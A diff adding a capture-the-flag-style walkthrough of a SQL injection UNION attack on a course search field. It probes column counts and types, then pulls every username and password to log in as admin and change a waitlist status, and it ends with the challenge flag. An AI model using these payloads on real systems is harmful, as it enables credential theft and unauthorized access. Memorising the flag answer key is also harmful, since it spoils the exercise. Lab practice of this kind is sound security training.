@@ -1,0 +1,30 @@
+Login as Rejesh and go to any course.In search section we have to implement the union attack.
+First determine Number of columns by trying:
+(If Number of columns do not match then in response we will get all users)
+Rajesh' UNION Select NULL from users --<space>
+Rajesh' UNION Select NULL,NULL from users --<space>
+Rajesh' UNION Select NULL,NULL,NULL from users --<space>
+
+(If Number of columns  matches then in response we will get a row with Rajesh's details and a row with all NULL values)
+Rajesh' UNION Select NULL,NULL,NULL,NULL from users --<space>
+
+We infer that the query returns 4 columns
+
+Now we have to check data types of all the columns
+we can check by 
+Rajesh' UNION Select "a",NULL,NULL,NULL from users --<space>
+Rajesh' UNION Select NULL,"a",NULL,NULL from users --<space>
+Rajesh' UNION Select NULL,NULL,"a",NULL from users --<space>
+Rajesh' UNION Select NULL,NULL,NULL,"a" from users --<space>
+
+like that we have to keep on checking
+
+Finally the union attack:
+
+' UNION SELECT NULL,CONCAT(username, ": ", password),NULL,NULL from users --<space>
+
+after getting the admin username and password we will login as admin and change waitlist status of Rajesh and get the flag
+
+FLAG{bsmv6RVaaVi8EdEqdsZJPBiouoOZhHSO}
+
+
